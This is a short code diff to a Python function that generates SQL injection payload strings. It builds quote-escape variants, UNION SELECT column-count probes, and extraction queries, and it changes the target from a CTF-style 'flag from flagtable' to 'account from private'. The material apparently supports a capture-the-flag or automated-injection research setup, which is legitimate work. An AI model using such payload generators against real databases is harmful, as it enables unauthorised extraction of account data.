@@ -11,16 +11,16 @@ def generate_actions(max_columns = 5, escapes = ["'", '"',""]):
     flag_actions = []
     for i in range(1,max_columns+1):
         row_confirmation.append("{0} union select"+ " NULL,"*i)
-        flag_actions.append("{0} union select flag," + " NULL,"*(i-1))
+        flag_actions.append("{0} union select account," + " NULL,"*(i-1))
 
         #Maybe not the best way to remove the last comma and add comment lines, but it will do
         row_confirmation[-1] = row_confirmation[-1][:-1] + " --"
-        flag_actions[-1] = flag_actions[-1][:-1] +  " from flagtable --"
+        flag_actions[-1] = flag_actions[-1][:-1] +  " from private --"
 
 
     action_types = [prelim, row_confirmation, flag_actions]
 
-    all_actions = []
+    all_actions = [""]
     #Finally create all the actions
     for escape in escapes:
         for action_type in action_types:
